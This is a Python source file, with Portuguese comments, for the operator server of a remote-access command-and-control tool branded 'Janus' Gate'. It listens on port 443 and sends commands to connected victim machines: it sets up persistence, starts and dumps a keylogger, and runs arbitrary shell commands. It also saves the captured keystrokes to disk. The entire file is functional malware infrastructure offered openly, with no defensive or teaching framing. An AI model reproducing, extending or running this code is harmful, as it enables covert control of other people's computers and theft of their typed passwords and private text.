import os
import sys
import socket
from datetime import datetime

HOST = "0.0.0.0"   # Escuta em todas as interfaces de rede
PORT = 443         # Porta onde o servidor escuta
KEYLOGGER_PATH = "keylog_dumps"  # Diretório de saída dos dumps de keylog

# -----------------------------------------------------------------------------
# print_banner() — banner ASCII de abertura
# -----------------------------------------------------------------------------
# Apenas cosmético: desenha a arte do "Janus' Gate Command & Control Center"
# na tela do operador. Sem efeito na lógica.
def print_banner():
    print("""
    ▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌
    ▐             JANUS' GATE COMMAND & CONTROL CENTER              ▌
    ▐                       By Bl4ck0ni                             ▌
    ▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
    """)

# -----------------------------------------------------------------------------
# print_help() — mostra o menu de comandos disponíveis
# -----------------------------------------------------------------------------
# Imprime o mapa de comandos que o operador pode digitar (persistência,
# keylogger, shell). É só um print de texto formatado.
def print_help():
    print("""
    ▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌
    ▐                      AVALIABLE COMMANDS                       ▌
    ▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
    ▐                                                               ▌  
    ▐    PERSISTENCE:                                               ▌  
    ▐       /persistence status     - Check persistence status      ▌  
    ▐       /persistence setup      - Setup persistence             ▌  
    ▐                                                               ▌  
    ▐   KEYLOGGER:                                                  ▌  
    ▐       /keylog status          - Check keylogger status        ▌  
    ▐       /keylog start           - Start keylogger               ▌  
    ▐       /keylog stop            - Stop keylogger                ▌  
    ▐       /keylog dump            - Dump captured keys            ▌  
    ▐                                                               ▌  
    ▐   SYSTEM:                                                     ▌  
    ▐       cd <path>               - Change directory              ▌  
    ▐       /exit                   - Disconnect client             ▌  
    ▐       /help                   - Show this help menu           ▌    
    ▐       /clear                  - Clear screen                  ▌  
    ▐                                                               ▌  
    ▐   SHELL COMMANDS:                                             ▌  
    ▐       Any other command will be executed as shell command     ▌      
    ▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
    """)

# -----------------------------------------------------------------------------
# clear_system() — limpa o terminal do operador
# -----------------------------------------------------------------------------
# Simplesmente executa "cls" no Windows ou "clear" em Unix/Linux, dependendo
# do os.name, para "limpar" a tela quando requisitado.
def clear_system():
    os.system('cls' if os.name == 'nt' else 'clear')

# -----------------------------------------------------------------------------
# save_keylog(data, filename=None) — grava um dump de keylog em disco
# -----------------------------------------------------------------------------
# Cria o diretório de saída se não existir, gera um nome com timestamp
# (keylog_<data>_<hora>.txt) caso não receba um filename, e escreve o texto.
# Retorna True se salvou, False se deu erro.
def save_keylog(data, filename=None):
    try:
        if not os.path.exists(KEYLOGGER_PATH):
            os.makedirs(KEYLOGGER_PATH)
        
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"keylog_{timestamp}.txt"

        file_path = os.path.join(KEYLOGGER_PATH, filename)

        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(data)
        
        print(f"\n[+] keylog saved as: {filename}")
        return True

    except Exception as e:
        print(f"\n[-] Error saving keylog: {e}")
        return False

# -----------------------------------------------------------------------------
# handle_client(conn, addr) — atende um cliente conectado do início ao fim
# -----------------------------------------------------------------------------
# Fluxo de uma sessão:
#   1. Recebe/printa o "hello" que o cliente envia ao conectar.
#   2. Loop de interação: lê o comando digitado, envia ao cliente e lê a
#      resposta (com timeout de 2s até achar a terminação "\n\n").
#   3. Trata respostas especiais:
#        - [AUTO-SEND]  -> salva o keylog automaticamente em arquivo
#        - "/keylog dump" -> pergunta se quer salvar o dump em arquivo
#   4. "/exit" encerra a sessão. Ctrl+C também envia "/exit" ao cliente.
def handle_client(conn, addr):
    print(f"\n[#] Client connected from {addr[0]}:{addr[1]}")
    print(f"\n[i] Connection estabilished at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("[i] type '/help' for available commands\n")

    try:
        # Lê a primeira mensagem ("hello") do cliente e a exibe
        initial_msg = conn.recv(1024).decode('utf-8', errors='ignore')
        if initial_msg:
            print(initial_msg, end='')

        # Loop de comandos da sessão
        while True:
            try:
                # Prompt colorido: IP em verde, ">" em ciano
                command = input(f"\033[1;32m{addr[0]}\033[1;36m>\033[0;0m ").strip()

                if not command:
                    continue

                if command == "/help":
                    print_help()
                    continue

                if command == "/clear":
                    clear_system()
                    print_banner()
                    print(f'[#] Connected to {addr[0]}:{addr[1]}\n')
                    continue

                # Envia o comando para o cliente (com \n para o cliente saber
                # onde termina)
                conn.send(command.encode() + b"\n")

                if command == "/exit":
                    print("\n[!] Client disconnected")
                    break

                # Lê a resposta completa do cliente. O protocolo termina as
                # mensagens com "\n\n"; o servidor acumula chunk por chunk
                # até achar essa terminação ou estourar o timeout de 2s.
                response = b""
                conn.settimeout(2.0)

                while True:
                    try:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break

                        response += chunk

                        if response.endswith(b"\n\n"):
                            break

                    except socket.timeout:
                        break

                if response:
                    decoded = response.decode('utf-8', errors='ignore')

                    # Keylog disparado automaticamente quando o buffer encheu:
                    # salva direto em arquivo sem pedir confirmação.
                    if "[AUTO-SEND]" in decoded:
                        keylog_content = decoded.split("[AUTO-SEND]")[1].strip()
                        save_keylog(keylog_content)
                    
                    # Para /keylog dump, pergunta ao operador se quer salvar
                    elif command == "/keylog dump":
                        print(decoded)

                        if "[+] Keylog captured" in decoded:
                            save = input("Save this keylog? (y/n): ").lower()
                            if save == 'y':
                                save_keylog(decoded)
                    else:
                        print(decoded, end="")
                else:
                    print("[!] No response from client")

            except KeyboardInterrupt:
                print("\n [!] Interrupted. Sending exit command ...")
                conn.send(b"/exit\n")
                break
            
            except Exception as e:
                print(f"\n [-] Error: {e}")
        

    except Exception as e:
        print(f"[-] Connection error: {e}")

    finally:
        conn.close()
        print("\n[!] Connection closed")

# -----------------------------------------------------------------------------
# start_listener() — abre o servidor e aceita conexões
# -----------------------------------------------------------------------------
# Cria o socket, faz bind em (HOST, PORT), fica em listen (fila de 5) e entra
# num loop aceitando cliente por cliente. Depois que um cliente termina,
# pergunta se o operador quer continuar ouvindo por novas conexões.
def start_listener():
    # print_banner()

    try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)

        print(f"[i] Listening on {HOST}:{PORT}\n")
        print(f"[i] Waiting for connections ... \n")


        while True:
            try:
                connection, addr = s.accept()
                handle_client(connection, addr)

                print("\n" + "="*60)
                choice = input("Wait for new connection? (y/n): ").lower()

                if choice != 'y':
                    print("[!] Shutting sown listener ...")
                    break
                
                print(f"\n[i] Waiting for connections ... \n")


            except KeyboardInterrupt:
                print("\n[!] Interrupted by user")
                break
        
    
    except Exception as e:
        print(f"[-] Listener error: {e}")

    
    finally:
        s.close()
        print("[!] Listener stopped")


# -----------------------------------------------------------------------------
# __main__ — ponto de entrada do servidor
# -----------------------------------------------------------------------------
# Só chama start_listener() e trata o Ctrl+C para sair de forma limpa.
if __name__ == "__main__":
    try:
        start_listener()
    
    except KeyboardInterrupt:
        print("\n[!] Exiting ... ")
        sys.exit(0)